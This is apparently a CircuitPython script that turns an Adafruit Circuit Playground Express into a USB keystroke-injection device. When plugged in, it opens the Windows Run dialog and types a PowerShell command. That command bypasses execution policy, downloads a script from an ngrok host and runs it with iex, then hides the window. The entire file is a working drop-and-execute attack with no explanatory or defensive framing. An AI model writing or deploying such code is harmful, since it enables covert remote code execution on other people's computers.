import usb_hid
import time
from adafruit_circuitplayground.express import cpx
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

time.sleep(5)
kbd.send(Keycode.WINDOWS, Keycode.R)
time.sleep(0.5)
layout.write('''powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://d41cb395c6c7.ngrok.io/main.ps1')|iex"''')
kbd.send(Keycode.ENTER)
time.sleep(10)
kbd.send(Keycode.WINDOWS, Keycode.DOWN)
